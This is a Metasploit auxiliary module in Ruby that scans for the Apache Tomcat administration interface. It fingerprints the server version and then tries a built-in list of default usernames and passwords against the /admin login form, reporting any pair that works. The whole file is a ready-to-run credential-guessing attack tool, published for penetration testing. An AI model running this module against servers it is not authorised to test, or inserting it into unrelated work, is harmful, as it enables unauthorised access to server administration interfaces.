##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::WmapScanServer
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Tomcat Administration Tool Default Access',
      'Description' => 'Detect the Tomcat administration interface.  The administration interface is included in versions 5.5 and lower.
                        Port 8180 is the default for FreeBSD, 8080 for all others.',
                        # version of admin interface source: O'Reilly Tomcat The Definitive Guide, page 82
      'References'  =>
        [
          ['URL', 'http://tomcat.apache.org/'],
        ],
      'Author'      => 'Matteo Cantoni <goony[at]nothink.org>',
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(8180), # 8180 is default for FreeBSD.  All other OSes it's 8080
        OptString.new('TOMCAT_USER', [ false, 'The username to authenticate as', '']),
        OptString.new('TOMCAT_PASS', [ false, 'The password for the specified username', '']),
      ])
  end

  def post_auth?
    true
  end

  def run_host(ip)

    begin
      res = send_request_raw(
        {
          'method'  => 'GET',
          'uri'     => '/',
        }, 25)

      http_fingerprint({ :response => res })

      if (res and res.code == 200)

        ver = ""

        if res.body.match(/<title>Apache Tomcat\/(.*)<\/title>/)
          ver = "Apache Tomcat/" + $1
        end

        user = datastore['TOMCAT_USER'].to_s
        pass = datastore['TOMCAT_PASS'].to_s

        if user.length == 0
          default_usernames = ['admin','manager','role1','root','tomcat']
        else
          default_usernames = [user]
        end

        if pass.length == 0
          default_passwords = ['admin','manager','role1','root','tomcat']
        else
          default_passwords = [pass]
        end

        default_usernames.each do |username|
          default_passwords.each do |password|

            res = send_request_raw({
              'method'  => 'GET',
              'uri'     => '/admin/',
            }, 25)

            if res && res.code == 200

              if res.get_cookies.match(/JSESSIONID=(.*);(.*)/i)

                jsessionid = $1

                post_data = "j_username=#{username}&j_password=#{password}"

                res = send_request_cgi({
                  'uri'          => '/admin/j_security_check',
                  'method'       => 'POST',
                  'content-type' => 'application/x-www-form-urlencoded',
                  'cookie'       => "JSESSIONID=#{jsessionid}",
                  'data'         => post_data,
                }, 25)

                if (res and res.code == 302)

                  res = send_request_cgi({
                    'uri'     => "/admin/",
                    'method'  => 'GET',
                    'cookie'  => "JSESSIONID=#{jsessionid}",
                  }, 25)

                  if (res and res.code == 302)

                    res = send_request_cgi({
                      'uri'     => "/admin/frameset.jsp",
                      'method'  => 'GET',
                      'cookie'  => "JSESSIONID=#{jsessionid}",
                    }, 25)

                    if (res and res.code == 200)
                      print_status("http://#{target_host}:#{rport}/admin [#{res.headers['Server']}] [#{ver}] [Tomcat Server Administration] [#{username}/#{password}]")
                    end

                    # LogOut
                    res = send_request_cgi({
                      'uri'          => '/admin/logOut.do',
                      'method'       => 'GET',
                      'cookie'       => "JSESSIONID=#{jsessionid}",
                    }, 25)
                  end
                end
              end
            end
          end
        end
      end

      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end
end
